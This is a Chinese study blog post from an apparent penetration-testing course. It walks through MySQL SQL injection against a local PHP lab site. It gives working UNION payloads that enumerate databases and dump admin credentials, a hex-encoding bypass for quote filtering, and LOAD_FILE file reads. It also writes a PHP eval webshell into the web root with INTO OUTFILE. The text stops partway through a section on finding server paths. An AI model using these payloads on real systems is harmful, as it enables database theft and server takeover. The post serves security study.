---
layout: post
title: "第42天WEB攻防-PHP应用MYSQL架构SQL注入跨库查询文件读写权限操作"
date: 2025-03-10 03:39:34 +0800
description: "1.root用户与用户A,用户B对数据库的管理区别2.获取相关数据：1、数据库版本-看是否符合information_schema查询-version()2、数据库用户-看**是否符合ROOT型注入攻击-user()**3、当前操作系统-看是否支持大小写或文件路径选择-@@version_compile_os4、数据库名字-为后期猜解指定数据库下的表，列做准备-database()3.infomation_schema的介绍及如何查询。4.如何一步一步获取数据。"
keywords: "第42天：WEB攻防-PHP应用&MYSQL架构&SQL注入&跨库查询&文件读写&权限操作"
categories: ['小豆Study']
tags: ['架构', 'Sql', 'Mysql']
artid: "146134506"
image:
    path: https://api.vvhan.com/api/bing?rand=sj&artid=146134506
    alt: "第42天WEB攻防-PHP应用MYSQL架构SQL注入跨库查询文件读写权限操作"
render_with_liquid: false
featuredImage: https://bing.ee123.net/img/rand?artid=146134506
featuredImagePreview: https://bing.ee123.net/img/rand?artid=146134506
cover: https://bing.ee123.net/img/rand?artid=146134506
image: https://bing.ee123.net/img/rand?artid=146134506
img: https://bing.ee123.net/img/rand?artid=146134506
---

<div class="blog-content-box">
 <div class="article-header-box">
  <div class="article-header">
   <div class="article-title-box">
    <h1 class="title-article" id="articleContentId">
     第42天：WEB攻防-PHP应用&amp;MYSQL架构&amp;SQL注入&amp;跨库查询&amp;文件读写&amp;权限操作
    </h1>
   </div>
  </div>
 </div>
 <article class="baidu_pl">
  <div class="article_content clearfix" id="article_content">
   <link href="../../assets/css/kdoc_html_views-1a98987dfd.css" rel="stylesheet"/>
   <link href="../../assets/css/ck_htmledit_views-704d5b9767.css" rel="stylesheet"/>
   <div class="htmledit_views" id="content_views">
    <h2 id="%E6%97%B6%E9%97%B4%E8%BD%B4%EF%BC%9A" name="%E6%97%B6%E9%97%B4%E8%BD%B4%EF%BC%9A">
     时间轴：
    </h2>
    <p>
     <img alt="" height="621" src="https://i-blog.csdnimg.cn/direct/2c85979478e9417f9a143bea472a13a0.jpeg" width="1819"/>
    </p>
    <h2 id="42%E5%A4%A9%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93%EF%BC%9A" name="42%E5%A4%A9%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93%EF%BC%9A">
     42天知识点总结：
    </h2>
    <blockquote>
     <p>
      1.root用户与用户A,用户B对数据库的管理区别
     </p>
     <p>
      2.获取相关数据：
      <br/>
      1、数据库版本-看是否符合information_schema查询-version()
      <br/>
      2、数据库用户-看**是否符合ROOT型注入攻击-user()**
      <br/>
      3、当前操作系统-看是否支持大小写或文件路径选择-@@version_compile_os
      <br/>
      4、数据库名字-为后期猜解指定数据库下的表，列做准备-database()
     </p>
     <p>
      3.infomation_schema的介绍及如何查询。
     </p>
     <p>
      4.如何一步一步获取数据
     </p>
     <p>
      5.进行root的跨库查询,且单引号16进制绕过方法。
     </p>
     <p>
      6.文件写入1.root ，2.secure_file_priv=
     </p>
    </blockquote>
    <p>
     MYSQL注入：（目的获取当前web权限）
     <br/>
     1、判断常见四个信息（系统，用户，数据库名，版本）
     <br/>
     2、根据四个信息去选择方案
    </p>
    <ul>
     <li>
      root用户：
      <strong>
       先测试读写，后测试获取数据
      </strong>
     </li>
     <li>
      非root用户：
      <strong>
       直接测试获取数据
      </strong>
     </li>
    </ul>
    <p>
    </p>
    <h2 id="%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A" name="%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A" style="background-color:transparent">
     知识点：
    </h2>
    <blockquote>
     <p>
      1、PHP-MYSQL-SQL注入-常规查询
      <br/>
      2、PHP-MYSQL-SQL注入-跨库查询
      <br/>
      3、PHP-MYSQL-SQL注入-文件读写
     </p>
    </blockquote>
    <p>
    </p>
    <h2 id="%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A" name="%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A">
     <span style="color:#0d0016">
      演示案例：
     </span>
    </h2>
    <blockquote>
     <p>
      <span style="color:#0d0016">
       PHP-MYSQL-Web 组成架构
      </span>
     </p>
     <p>
      <span style="color:#0d0016">
       PHP-MYSQL-SQL 常规查询
      </span>
     </p>
     <p>
      <span style="color:#0d0016">
       PHP-MYSQL-SQL 跨库查询
      </span>
     </p>
     <p>
      <span style="color:#0d0016">
       PHP-MYSQL-SQL 文件读写
      </span>
     </p>
    </blockquote>
    <p>
    </p>
    <h4 id="" name="">
    </h4>
    <h3 style="background-color:transparent">
     <span style="color:#0d0016">
      PHP-MYSQL-Web 组成架构
     </span>
    </h3>
    <blockquote>
     <div>
      <span style="color:#000000">
       服务器安装
      </span>
      <span style="color:#000000">
       MYSQL
      </span>
      <span style="color:#000000">
       数据库，搭建多个站点，数据库集中存储
      </span>
      <span style="color:#000000">
       MYSQL
      </span>
      <span style="color:#000000">
       数据库中管理
      </span>
     </div>
     <div>
      <span style="color:#000000">
       可以都使用
      </span>
      <span style="color:#000000">
       root
      </span>
      <span style="color:#000000">
       用户管理也可以创建多个用户进行每个网站对应的数据库管理
      </span>
     </div>
     <div>
      <span style="color:#000000">
       1
      </span>
      <span style="color:#000000">
       、统一交
      </span>
      <span style="color:#000000">
       root
      </span>
      <span style="color:#000000">
       用户管理
      </span>
     </div>
     <div>
      <span style="color:#000000">
       www.zblog.com = zblog = root =&gt;MYSQL
      </span>
     </div>
     <div>
      <span style="color:#000000">
       www.demo01.com = demo01 = root =&gt;MYSQL
      </span>
     </div>
     <div>
      <span style="color:#000000">
       2
      </span>
      <span style="color:#000000">
       、一对一用户管理（推荐）
      </span>
     </div>
     <div>
      <span style="color:#000000">
       www.zblog.com = zblog = zblog =&gt;MYSQL
      </span>
     </div>
     <div>
      <span style="color:#000000">
       www.demo01.com = demo01 = demo01 =&gt;MYSQL
      </span>
     </div>
    </blockquote>
    <h4 style="background-color:transparent">
     <span style="color:#0d0016">
      首先进行网站搭建：
     </span>
    </h4>
    <p>
     1.将网站放入demo01放入phpstudy中然后使用phpstorm打开。
    </p>
    <p>
     2.
    </p>
    <p>
     1、连接数据库
     <br/>
     2、创建数据库（demo01）
     <br/>
     3、选择数据库demo01导入sql执行
    </p>
    <p>
     如不是数据库名demo01，需修改config.php文件里面的配置的数据库名信息
    </p>
    <p>
    </p>
    <h4 style="background-color:transparent">
     1.root用户与用户A,用户B对数据库的管理区别
    </h4>
    <p>
     <img alt="" height="1034" src="https://i-blog.csdnimg.cn/direct/78982f8ea7534611846ba48c52ca233b.png" width="1391"/>
    </p>
    <p>
     对于root用户：
    </p>
    <p>
     root一个人管所有。
    </p>
    <p>
    </p>
    <p>
     对于非root用户：
    </p>
    <p>
     一人管一个。
    </p>
    <p>
    </p>
    <h5>
     对比：
    </h5>
    <p>
     <img alt="" height="938" src="https://i-blog.csdnimg.cn/direct/c886317cc23543548daf0d8625b69e55.png" width="1197"/>
    </p>
    <p>
     demo0521只能看到自己，而root都可以看到。
    </p>
    <p>
     <img alt="" height="769" src="https://i-blog.csdnimg.cn/direct/aa7ae516f2fd4204b7483e8ad1c46081.png" width="500"/>
    </p>
    <p>
    </p>
    <h3 style="background-color:transparent">
     PHP-MYSQL-SQL常规查询
    </h3>
    <h4>
     1.SQL注人的概念
    </h4>
    <p>
     原理：接受的参数值
     <strong>
      未进行过滤
     </strong>
     直接带入SQL查询的操作
     <br/>
     攻击：
     <strong>
      利用SQL语句执行你想要的东西
     </strong>
     （SQL语句能干嘛，注人就能干嘛）
     <br/>
     <strong>
      SQL语句能干嘛⇒SQL语句由谁决定⇒数据库类型决定〈为什么mysql注入。oracle注人叫法原因）
     </strong>
    </p>
    <p>
     <img alt="" height="271" src="https://i-blog.csdnimg.cn/direct/f7da749686624d2b98e6bd438bc697fb.png" width="1153"/>
    </p>
    <h5>
     access注入与mysql的区别：
    </h5>
    <p>
     <img alt="" height="692" src="https://i-blog.csdnimg.cn/direct/61bc2700c1e64d3ea644d2ea937c77d9.png" width="1218"/>
    </p>
    <h4>
     2.SQL注人的流程介绍：
    </h4>
    <p>
     获取相关数据：
     <br/>
     1、数据库版本-看是否符合information_schema查询-version()
     <br/>
     2、数据库用户-看**是否符合ROOT型注入攻击-user()**
     <br/>
     3、当前操作系统-看是否支持大小写或文件路径选择-@@version_compile_os
     <br/>
     4、数据库名字-为后期猜解指定数据库下的表，列做准备-database()
    </p>
    <p>
    </p>
    <h5>
     infomation_schema介绍：
    </h5>
    <p>
     <span style="background-color:#fbd4d0">
      information_schema
     </span>
     ：存储数据库下的数据库名及表名，列名信息的数据库
     <br/>
     <span style="background-color:#fbd4d0">
      information_schema.schemata
     </span>
     ：记录数据库名信息的表
     <br/>
     <span style="background-color:#fbd4d0">
      information_schema.tables
     </span>
     ：记录表名信息的表
     <br/>
     <span style="background-color:#fbd4d0">
      information_schema.columns
     </span>
     ：记录列名信息表
     <br/>
     <span style="background-color:#fbd4d0">
      schema_name
     </span>
     ：information_schema.schemata
     <span style="background-color:#fbd4d0">
      记录**数据库名信息的列名值**
     </span>
     <br/>
     <span style="background-color:#fbd4d0">
      table_schema
     </span>
     ：information_schema.tables
     <span style="background-color:#fbd4d0">
      记录**数据库名的列名值**
     </span>
     <br/>
     <span style="background-color:#fbd4d0">
      table_name
     </span>
     ：information_schema.tables记录
     <span style="background-color:#fbd4d0">
      **表名的列名值**
     </span>
     <br/>
     <span style="background-color:#fbd4d0">
      column_name
     </span>
     ：information_schema.columns
     <span style="background-color:#fbd4d0">
      **记录列名的列名值**
     </span>
    </p>
    <h6>
     <span style="background-color:null">
      解释：
     </span>
    </h6>
    <p>
     原数据库数据（相对应）：
    </p>
    <p>
     <img alt="" height="289" src="https://i-blog.csdnimg.cn/direct/6b1ad8b51fa44f498701b0f9f17c28c5.png" width="293"/>
    </p>
    <p>
     <img alt="" height="938" src="https://i-blog.csdnimg.cn/direct/6f61e39894624ff795b3659887680124.png" width="1129"/>
    </p>
    <p>
     <span style="background-color:null">
      1.
     </span>
     <span style="background-color:#fbd4d0">
      information_schema.schemata
     </span>
     ：记录数据库名信息的表
    </p>
    <p>
     <img alt="" height="1271" src="https://i-blog.csdnimg.cn/direct/b852ff52ca3b4f4ca016244645e38c9b.png" width="2018"/>
    </p>
    <p>
     <img alt="" height="689" src="https://i-blog.csdnimg.cn/direct/211e5c8843a3458097969678797620d4.png" width="1834"/>
    </p>
    <p>
     <span style="background-color:#fbd4d0">
      information_schema.schemata
     </span>
     <span style="background-color:null">
      中的.意思是在
     </span>
     <span style="background-color:#fbd4d0">
      information_schema
     </span>
     <span style="background-color:null">
      下面查找
     </span>
     <span style="background-color:#fbd4d0">
      schemata
     </span>
    </p>
    <h6>
     举例：（.的意思）
    </h6>
    <p>
     我要搜索的是root下面的wolive_admin的表。
    </p>
    <p>
     <img alt="" height="1137" src="https://i-blog.csdnimg.cn/direct/5338a1b8649849bf8c7717bc7efb2d0a.png" width="2122"/>
    </p>
    <p>
     使用查询语句：
    </p>
    <p>
     <img alt="" height="776" src="https://i-blog.csdnimg.cn/direct/5af4184d61d34b648da1adaf11a53d45.png" width="1164"/>
    </p>
    <p>
     会显示在demo01下查询不到表（因为他们不在一个目录下）。
    </p>
    <p>
     若加上root.就会成功。
    </p>
    <p>
     <img alt="" height="744" src="https://i-blog.csdnimg.cn/direct/78276c88e2c746d68139a80d5f1dc8b7.png" width="1210"/>
    </p>
    <p>
     <span style="background-color:null">
      2.
     </span>
     <span style="background-color:#fbd4d0">
      information_schema.tables
     </span>
     ：记录表名信息的表
    </p>
    <p>
     <img alt="" height="1142" src="https://i-blog.csdnimg.cn/direct/f3f6f7464e6e49ccbe2c9f88dee2197a.png" width="2126"/>
    </p>
    <p>
     3.
     <span style="background-color:#fbd4d0">
      information_schema.columns
     </span>
     ：记录列名信息表
    </p>
    <p>
     <img alt="" height="1141" src="https://i-blog.csdnimg.cn/direct/44f73c49209b4f9cb85909e2a8932607.png" width="2077"/>
    </p>
    <p>
    </p>
    <p>
    </p>
    <h4 style="background-color:transparent">
     3.SQL注人的流程：获取数据→一步一步得到信息
    </h4>
    <p>
    </p>
    <p>
     <code>
      <span style="background-color:null">
       1.
      </span>
      <span style="color:#ed7976">
       <span style="background-color:#fef2f0">
        order by 6
       </span>
      </span>
     </code>
     ：这是一个排序语句，指示按照
     <strong>
      第6列进行排序
     </strong>
     。
    </p>
    <ol>
     <li>
      <p>
       实战中，需要进行判断注入的列名有几个。
      </p>
     </li>
     <li>
      <p>
       有的话页面正常执行
      </p>
     </li>
     <li>
      <p>
       没有即会报错
      </p>
     </li>
     <li>
      <p>
       如：
       <strong>
        该表存在6列，输入7后会报错
       </strong>
      </p>
     </li>
    </ol>
    <p>
     order by 6 会正常显示：
    </p>
    <p>
     <img alt="" height="1292" src="https://i-blog.csdnimg.cn/direct/ebe874b76932434cab6eca4341a7f939.png" width="1900"/>
    </p>
    <p>
     order by 7 会报错：
    </p>
    <p>
     <img alt="" height="1287" src="https://i-blog.csdnimg.cn/direct/a43dad262d0f41d786099f5e939b0a0c.png" width="1906"/>
    </p>
    <p>
     数据正好也只有6列：
    </p>
    <p>
     <img alt="" height="209" src="https://i-blog.csdnimg.cn/direct/5e3bbd8a9ff2434c98427973f6ea0bfb.png" width="662"/>
    </p>
    <p>
     证明有6列。
    </p>
    <p>
     也可以使用网上插件。
    </p>
    <p>
     <img alt="" height="484" src="https://i-blog.csdnimg.cn/direct/65053731d2e24269801c892dc0b5dc8e.png" width="1001"/>
    </p>
    <p>
     2.
     <span style="color:#ed7976">
      <span style="background-color:#fef2f0">
       union select 1,2,3,4,5,6
      </span>
     </span>
     ：这是一个UNION查询，用于将多个SELECT语句的结果合并在一起。在这个例子中，它选择了6个列，每个SELECT语句都返回常量值。
    </p>
    <ol>
     <li>
      发现执行后回显的数据：分别出现在网页署名（2），正标题（3），副标题（4），次标题（5）
     </li>
     <li>
      如果没有回显数据，则在查询id加入负号即可http://192.168.137.1:84/new.php?id=-1 union select 1,2,3,4,5,6（使其进行报错）
     </li>
     <li>
      查找回显的作用：可以判断后期注入查询返回的数据，可以在页面中显示出来；
     </li>
    </ol>
    <p>
     <img alt="" height="701" src="https://i-blog.csdnimg.cn/direct/463e3de3b69b4fbca0f4c8dd9f9a8bd1.png" width="550"/>
    </p>
    <p>
     3.
     <span style="color:#ed7976">
      <code>
       <span style="background-color:#fef2f0">
        union select 1,2,3,database(),user(),6
       </span>
      </code>
     </span>
     ：这个UNION查询选择了6个列，并在
     <strong>
      第4列返回数据库名称
     </strong>
     ，
     <strong>
      第5列返回当前用户
     </strong>
     ，其他列返回常量值。
    </p>
    <p>
     <img alt="" height="753" src="https://i-blog.csdnimg.cn/direct/e66f5a43c23d49f794ab27e545fe7826.png" width="845"/>
    </p>
    <p>
     4.
     <span style="color:#ed7976">
      <code>
       <span style="background-color:#fef2f0">
        union select 1,2,3,version(),@@version_compile_os,6
       </span>
      </code>
     </span>
     ：这个UNION查询选择了6个列，
     <strong>
      并在第4列返回数据库版本
     </strong>
     ，
     <strong>
      第5列返回操作系统信息
     </strong>
     ，其他列返回常量值。
    </p>
    <ol>
     <li>
      返回
      <strong>
       数据库版本
      </strong>
      原因：MYSQL5.0以上版本：自带的数据库名information_schema（
      <strong>
       只有5.0以上的版本才可以实行下一步查询
      </strong>
      ）
     </li>
     <li>
      返回
      <strong>
       操作系统信息
      </strong>
      原因：如果
      <strong>
       是Linux系统
      </strong>
      对于后面的查询信息，
      <strong>
       大小写特定敏感
      </strong>
     </li>
    </ol>
    <p>
     <img alt="" height="1108" src="https://i-blog.csdnimg.cn/direct/ea4508e8adc647ad8d9cd65b7748b4a3.png" width="1908"/>
    </p>
    <p>
     已找到数据库demo01
    </p>
    <p>
     <img alt="" height="387" src="https://i-blog.csdnimg.cn/direct/1c045ac0a683474ab20cc59b8511e4dd.png" width="447"/>
    </p>
    <p>
     5.
     <span style="color:#ed7976">
      <span style="background-color:#fef2f0">
       union select 1,2,3,4,group_concat(table_name),6 from information_schema.tables where table_schema='demo01'
      </span>
     </span>
     ：这个UNION查询选择了6个列，并从information_schema.tables表中返回指定数据库（demo01）中的所有表名的组合字符串。
    </p>
    <p>
     <img alt="" height="89" src="https://i-blog.csdnimg.cn/direct/a4e6ac3793964df6bece719dce424a26.png" width="967"/>
    </p>
    <ol>
     <li>
      information_schema.tables表
      <strong>
       记录表名信息的表
      </strong>
     </li>
     <li>
      <code>
       table_schema
      </code>
      ：information_schema.tables记录**
      <code>
       数据库名的列名值
      </code>
      **
     </li>
     <li>
      <code>
       table_name
      </code>
      ：information_schema.tables记录**
      <code>
       表名的列名值
      </code>
      **
     </li>
     <li>
      group_concat()是全部查询出来
     </li>
    </ol>
    <p>
     实质上就是获取demo01下的这三个值：
    </p>
    <p>
     <img alt="" height="902" src="https://i-blog.csdnimg.cn/direct/7d6010992b2c49698c609055dfcdabe8.png" width="1268"/>
    </p>
    <p>
     <img alt="" height="1177" src="https://i-blog.csdnimg.cn/direct/93c837586c9f4f8182cb87c5ad1977ea.png" width="1900"/>
    </p>
    <p>
    </p>
    <p>
     6.
     <span style="color:#ed7976">
      <span style="background-color:#fef2f0">
       union select 1,2,3,4,group_concat(column_name),6 from information_schema.columns where table_schema='demo01' and table_name='admin'
      </span>
     </span>
     ：这个UNION查询选择了6个列，并从information_schema.columns表中返回指定表（admin）中的所有列名的组合字符串。
    </p>
    <p>
     <img alt="" height="95" src="https://i-blog.csdnimg.cn/direct/9384a11ae2e64fcd9fa994eb568b70d8.png" width="956"/>
    </p>
    <p>
    </p>
    <ol>
     <li>
      <p>
       <code>
        information_schema.columns
       </code>
       <strong>
        记录列名信息表
       </strong>
      </p>
     </li>
     <li>
      <p>
       <code>
        table_name
       </code>
       ：information_schema.tables记录**
       <code>
        表名的列名值
       </code>
       **
      </p>
     </li>
     <li>
      <p>
       <code>
        column_name：
       </code>
       information_schema.columns
       <code>
        **记录列名的列名值**
       </code>
      </p>
     </li>
    </ol>
    <p>
     <img alt="" height="1149" src="https://i-blog.csdnimg.cn/direct/33644fa48c8f470b9b6cce74e9504e86.png" width="2112"/>
    </p>
    <p>
     <img alt="" height="1093" src="https://i-blog.csdnimg.cn/direct/e4c0ba034b164f8da4a1fac4febe5f3a.png" width="1902"/>
    </p>
    <p>
     7.
     <span style="color:#ed7976">
      <code>
       <span style="background-color:#fef2f0">
        union select 1,2,3,username,password,6 from admin limit 0,1
       </span>
      </code>
     </span>
     ：这个UNION查询选择了6个列，并从
     <strong>
      admin表中返回第一行记录的用户名和密码。
     </strong>
    </p>
    <ol>
     <li>
      limit 0,1代表是查询第一条。
     </li>
     <li>
      limit 0,2代表是查询第二条。
     </li>
    </ol>
    <p>
     若没显示可以用id=-1来使其报错显示。
    </p>
    <p>
     http://172.20.10.6/new.php?id=-1 union select 1,2,3,username,password,6 from admin limit 0,1
    </p>
    <p>
     <img alt="" height="1026" src="https://i-blog.csdnimg.cn/direct/de71b4e3a7fa499d8c6c9b82d10a5ad2.png" width="1894"/>
    </p>
    <p>
     http://172.20.10.6/new.php?id=-1 union select 1,2,3,username,password,6 from admin limit 0,2
    </p>
    <p>
     <img alt="" height="1101" src="https://i-blog.csdnimg.cn/direct/c3ae651ca4194ef890c49c346b69ce5e.png" width="1906"/>
    </p>
    <p>
     也可以是使用
    </p>
    <p>
     http://172.20.10.6/new.php?id=-1 union select 1,2,3,username,password,6 from admin where id =1
    </p>
    <p>
     对应以下数据：
    </p>
    <p>
     <img alt="" height="171" src="https://i-blog.csdnimg.cn/direct/96a969df2a15465598cf3ac1d84fc288.png" width="337"/>
    </p>
    <p>
     <a href="https://blog.csdn.net/Aery_ha/article/details/143787129?ops_request_misc=%257B%2522request%255Fid%2522%253A%25221bafa421cc6262091ed0bcde20881b40%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=1bafa421cc6262091ed0bcde20881b40&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-143787129-null-null.142^v102^pc_search_result_base7&amp;utm_term=sql%E6%B3%A8%E5%85%A5limit&amp;spm=1018.2226.3001.4187" title="【SQL注入]limit的基础运用_limit注入-CSDN博客">
      【SQL注入]limit的基础运用_limit注入-CSDN博客
     </a>
     】
    </p>
    <h3>
     PHP-MYSQL-SQL跨库查询
    </h3>
    <p>
     <img alt="" height="404" src="https://i-blog.csdnimg.cn/direct/6cd189f6fe894e6f93105500e2a9b47b.png" width="1366"/>
    </p>
    <p>
     影响条件：
     <strong>
      当前数据库ROOT用户权限
     </strong>
    </p>
    <h4>
     <strong>
      1.先查看是否是root：
     </strong>
    </h4>
    <p>
     <img alt="" height="852" src="https://i-blog.csdnimg.cn/direct/db87798a93894078b831e8dff3e97ee4.png" width="790"/>
    </p>
    <h4 style="background-color:transparent">
     2.跨库查询顺序
    </h4>
    <p>
     1
     <span style="color:#ed7976">
      <span style="background-color:#fef2f0">
       .union select 1,2,3,4,group_concat(schema_name),6 from information_schema.schemata:
      </span>
     </span>
     <span style="color:null">
      通过
     </span>
     <span style="color:#ed7976">
      <span style="background-color:#fef2f0">
       information_schema.schemata
      </span>
     </span>
     表获取所有数据库的名称，并将这些名称连接成一个字符串。
    </p>
    <p>
     <img alt="" height="149" src="https://i-blog.csdnimg.cn/direct/7afa3415cbe54f9c885537ab85f83b58.png" width="1599"/>
    </p>
    <p>
     <img alt="" height="1331" src="https://i-blog.csdnimg.cn/direct/a555f5803fa94813820a81792ae17a8c.png" width="1900"/>
    </p>
    <p>
     2.
     <span style="color:#ed7976">
      <span style="background-color:#fef2f0">
       union select 1,2,3,4,group_concat(table_name),6 from information_schema.tables where table_schema='zblog'
      </span>
     </span>
     : 通过 information_schema.tables 表获取 ‘zblog’ 数据库中所有表的名称，并将这些名称连接成一个字符串。
    </p>
    <p>
     <img alt="" height="1316" src="https://i-blog.csdnimg.cn/direct/169097e328c04e7a93b5adfbc04d97c0.png" width="1908"/>
    </p>
    <p>
     3.
     <span style="color:#ed7976">
      <span style="background-color:#fef2f0">
       union select 1,2,3,4,group_concat(column_name),6 from information_schema.columns where table_name='zbp_member' and table_schema='zblog'
      </span>
     </span>
     : 通过 information_schema.columns 表获取 ‘zblog’ 数据库中 ‘zbp_member’ 表的所有列名，并将这些列名连接成一个字符串。
    </p>
    <p>
     <img alt="" height="1259" src="https://i-blog.csdnimg.cn/direct/dafc09ee5650426fbad9d5854b3ca721.png" width="1904"/>
    </p>
    <p>
    </p>
    <p>
     4.
     <span style="color:#ed7976">
      <span style="background-color:#fef2f0">
       union select 1,2,3,mem_Name,mem_Password,6 from zblog.zbp_member
      </span>
     </span>
     : 尝试从 ‘zblog’ 数据库的 ‘zbp_member’ 表中选择 mem_Name 和 mem_Password 列的数据，限制结果集为一个行。
    </p>
    <p>
     记住使用.来进行跨库查询
    </p>
    <p>
     <img alt="" height="977" src="https://i-blog.csdnimg.cn/direct/d274433319f34e33a4264bf086f13840.png" width="1908"/>
    </p>
    <p>
    </p>
    <p>
    </p>
    <h4 style="background-color:transparent">
     3.注意事项
    </h4>
    <p>
     注意：
     <strong>
      由于是跨库操作，在此刻必须指明是哪个数据库的表名
     </strong>
    </p>
    <ol>
     <li>
      <code>
       from zblog.zbp_member
      </code>
      :
     </li>
     <li>
      不然会进行
      <strong>
       报错
      </strong>
     </li>
     <li>
      表示
      <strong>
       <code>
        mysqli_query
       </code>
      </strong>
      返回的结果不是有效的
      <strong>
       <code>
        mysqli_result
       </code>
      </strong>
      对象，而是布尔值
      <strong>
       <code>
        false
       </code>
      </strong>
      ，可能是由于 SQL 查询执行失败。
     </li>
     <li>
      <img alt="" height="396" src="https://i-blog.csdnimg.cn/direct/65826537c3424bdbbb9246443ba28500.png" width="1213"/>
     </li>
    </ol>
    <p>
     <strong>
      必须数据库权限是ROOT用户权限→才可以进行跨库：
     </strong>
    </p>
    <p>
     <strong>
      root权限：
     </strong>
    </p>
    <p>
     <img alt="" height="290" src="https://i-blog.csdnimg.cn/direct/f00f66e3b60a4c6d86c43be1bdcc5cfd.png" width="722"/>
    </p>
    <p>
     <strong>
      普通权限：
     </strong>
     <img alt="" height="349" src="https://i-blog.csdnimg.cn/direct/72c93f70a90b42e084a699b94d49fabf.png" width="745"/>
    </p>
    <h4>
     单引号过滤绕过方式：
    </h4>
    <p>
     可以使用单引号绕过warf等。
    </p>
    <p>
     SQL注入语句使用单引号就不要编码，编码就不用单引号（路径，表名，数据库名等）注意：在编码后执行SQL注入时候要在编码前加0x
    </p>
    <p>
     当在编码后执行SQL注入时，如果要将编码后的Payload作为十六进制值直接传递给SQL语句，需要在编码前添加0x前缀。这是因为在许多DBMS中，
     <span style="background-color:#ffd900">
      0x
     </span>
     前缀用于指示后续的字符串是十六进制值。
    </p>
    <p>
     Hex编码（十六进制编码）是一种将数据转换为十六进制数字表示的编码方式。这种编码方式广泛用于表示二进制数据，例如在网络通信、编码传输、调试和数据存储中。
    </p>
    <p>
     使用软件：CaptfEncoder：
    </p>
    <p>
     举例：
    </p>
    <p>
     <span style="color:#ed7976">
      <span style="background-color:#fef2f0">
       union select 1,2,3,4,group_concat(table_name),6 from information_schema.tables where table_schema='zblog'
      </span>
     </span>
     可以改为
     <span style="color:#ed7976">
      <span style="background-color:#fef2f0">
       union select 1,2,3,4,group_concat(table_name),6 from information_schema.tables where table_schema=0x7a626c6f67
      </span>
     </span>
    </p>
    <p>
     <img alt="" height="1034" src="https://i-blog.csdnimg.cn/direct/0b47f05d58ef4ee4bc3ac2f23307d0c8.png" width="759"/>
    </p>
    <p>
     <img alt="" height="859" src="https://i-blog.csdnimg.cn/direct/29faaec81bb3464c9d69fa28f8aea4dd.png" width="1768"/>
    </p>
    <h3>
     PHP-MYSQL-SQL文件读写：
    </h3>
    <p>
     <img alt="" height="302" src="https://i-blog.csdnimg.cn/direct/15b2fdd40fbe4e10afb368fbae3bdd2a.png" width="972"/>
    </p>
    <h4 style="background-color:transparent">
     条件1：
    </h4>
    <p>
     在root里面：
     <img alt="" height="696" src="https://i-blog.csdnimg.cn/direct/9c383e813ed3433d944400636b8c3e57.png" width="1248"/>
    </p>
    <p>
     在普通用户下：
    </p>
    <p>
     <img alt="" height="687" src="https://i-blog.csdnimg.cn/direct/b1691b5cfcc948b49f7caaca1ad89efa.png" width="1245"/>
    </p>
    <h4 style="background-color:transparent">
     条件2：
    </h4>
    <p>
     secure_file_priv=  这个存在
    </p>
    <p>
     <img alt="" height="1264" src="https://i-blog.csdnimg.cn/direct/93e695353a294b8ca28a4dace80d58fd.png" width="2074"/>
    </p>
    <p>
     <span style="color:#ed7976">
      <span style="background-color:#fef2f0">
       secure_file_priv
      </span>
     </span>
     是 MySQL 数据库中的一个系统变量，用于限制使用 LOAD DATA INFILE 和 SELECT ... INTO OUTFILE 语句时可以读取和写入的文件的路径。这个变量通常用于提高数据库的安全性，防止用户滥用这些语句导致的文件系统访问。
    </p>
    <p>
     如果设置了这个变量，MySQL 将仅允许在指定的路径下进行文件的读取和写入操作。
     <br/>
     如果没有设置，MySQL 将默认使用空值，表示都可以查询使用。
     <br/>
     例如，如果
     <span style="color:#ed7976">
      <span style="background-color:#fef2f0">
       secure_file_priv
      </span>
     </span>
     被设置为 f:\\，那么在执行 LOAD DATA INFILE 或 SELECT ... INTO OUTFILE 时，只允许读写位于 f:\\ 目录下的文件。
    </p>
    <p>
     <img alt="" height="1229" src="https://i-blog.csdnimg.cn/direct/6cbd23b5ef0742f6bcfe15d059d810de.png" width="1994"/>
    </p>
    <h4>
     演示：
    </h4>
    <p>
     1.将1.txt信息获取出来
    </p>
    <p>
     http://172.20.10.6/new.php?id=1 union select 1,2,3,LOAD_FILE("d:\\1.txt"),5,6
    </p>
    <p>
     <span style="color:#ed7976">
      <span style="background-color:#fef2f0">
       union select 1,2,3,LOAD_FILE("d:\\1.txt"),5,6
      </span>
     </span>
     <span style="color:null">
      <span style="background-color:null">
       使用此语句将1.txt读取出来
      </span>
     </span>
    </p>
    <p>
     <span style="color:#ed7976">
      <strong>
       <code>
        <span style="background-color:#fef2f0">
         load_file
        </span>
       </code>
      </strong>
      <span style="background-color:#fef2f0">
      </span>
     </span>
     函数
     <strong>
      加载本地文件 ‘d:\1.txt’ 的内容
     </strong>
     ，并将其作为查询结果的一部分返回。
    </p>
    <p>
     <img alt="" height="1092" src="https://i-blog.csdnimg.cn/direct/c28e72161d054c2b8c008bfefde852c2.png" width="1551"/>
    </p>
    <p>
     2.如何获取权限：
    </p>
    <p>
     http://172.20.10.6/new.php?id=1 union select 1,2,3,'&lt;?php eval($_POST[x]);?&gt;',5,6 into outfile 'E:\\phpstudy\\phpstudy_pro\\WWW\\demo01\\1.php'
    </p>
    <p>
     其中将
     <span style="color:#ed7976">
      <span style="background-color:#fef2f0">
       union select 1,2,3,'&lt;?php eval($_POST[x]);?&gt;',5,6 into outfile 'E:\\phpstudy\\phpstudy_pro\\WWW\\demo01\\1.php'
      </span>
     </span>
     <span style="color:null">
      <span style="background-color:null">
       从中将一句话放入文件当中
      </span>
     </span>
    </p>
    <p>
     <img alt="" height="714" src="https://i-blog.csdnimg.cn/direct/0cca1d466658426bae815e16ffae1e4a.png" width="1936"/>
    </p>
    <h5>
     如何获取读取路径呢？
    </h5>
    <p>
     <img alt="" height="328" src="https://i-blog.csdnimg.cn/direct/8fd3a47cea2346f98d2816e1d7b6e145.png" width="1110"/>
    </p>
    <p>
     1.通常中间件这些由文件：（读敏感文件）
    </p>
    <p>
     E:\phpstudy\phpstudy_pro\Extensions\Apache2.4.39\conf\vhosts
    </p>
    <p>
